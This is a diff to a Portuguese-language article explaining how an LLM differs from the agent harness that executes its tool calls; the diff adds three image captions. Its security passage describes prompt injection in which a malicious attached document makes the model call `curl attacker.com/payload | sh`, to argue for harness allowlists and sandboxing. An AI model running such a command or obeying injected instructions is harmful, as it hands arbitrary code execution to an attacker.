@@ -21,6 +21,8 @@ Existem duas peças distintas quando você usa Claude Code, Codex, Cursor, ou qu
 - **O modelo (LLM):** arquivo de pesos de vários gigabytes carregado na GPU. Só gera texto. Nunca cria arquivo. Nunca roda comando. Nunca acessa internet. Sozinho, é um motor desligado em cima da mesa.
 - **O harness:** programa que conversa com a LLM. Executa as ações que ela pede. Cria arquivo, roda teste, instala pacote, abre branch, faz push. Sem harness, a LLM só fala.
 
+![Modelo vs harness lado a lado: a LLM só gera texto e nunca toca no disco; o harness executa e tem as permissões](images/01-modelo-vs-harness.png)
+
 Como funciona o loop na prática quando você pede "crie um site":
 
 1. O harness manda o pedido pra LLM via API (junto com instruções escondidas do system prompt).
@@ -31,6 +33,8 @@ Como funciona o loop na prática quando você pede "crie um site":
 6. Loop continua até a LLM dizer "terminei".
 
 A LLM nunca tocou no seu disco. Só o harness toca.
+
+![O loop agêntico em 5 passos: harness manda o pedido, LLM responde texto estruturado, harness executa e devolve, até a LLM dizer terminei](images/02-loop-agentico.png)
 
 ## A analogia do cavalo e da rédea
 
@@ -59,6 +63,8 @@ O harness é quem tem permissão de escrever em disco, instalar pacote, fazer pu
 Se o harness não tem allowlist clara do que pode rodar, prompt injection vira execução de código arbitrário. Um documento malicioso anexado ao chat instrui a LLM a chamar `bash("curl attacker.com/payload | sh")`. Sem proteção, o harness obedece. A LLM não tem culpa. Ela só passou a mensagem.
 
 Isso é o que diferencia harness sério (Claude Code com sandbox de tool, Anthropic Computer Use com permission scope) de harness frouxo (qualquer agente que dá acesso shell sem allowlist). Quem entende a separação modelo-harness avalia esse risco. Quem não entende pensa que "a IA executou o ataque" e culpa o modelo errado.
+
+![Quem confunde paga: 3-10x na fatura de inference, prompt injection virando execução de código, e quem separa compra certo](images/03-bolso-e-seguranca.png)
 
 ## Skills, agents, MCP: tudo é harness ficando mais sofisticado
 
